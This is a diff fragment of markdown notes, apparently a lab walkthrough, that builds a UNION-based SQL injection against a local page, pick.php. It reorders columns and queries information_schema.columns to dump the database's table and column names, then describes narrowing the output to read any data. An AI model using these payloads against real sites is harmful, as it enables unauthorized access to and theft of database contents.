@@ -131,12 +131,12 @@ ________________________________________________________________________________
 #### also notice for this there are only 3 fields, but they are out of order so adjust to match below
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT 1,3,2
 ______________________________________________________________________________________________________________
-## 
-### 
-
+## Once we know the order of the fields we can set up our Golden Statement
+### In original it goes table_schema,table_name,column_name but we need to switch the 2 and 3 field
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
 ______________________________________________________________________________________________________________
-## 
-### 
+## Once we get the output which will be the entire database we can now narrow the search
+### By doing this we can view any data inside we want based on the filters below
 
 ______________________________________________________________________________________________________________
 ## 
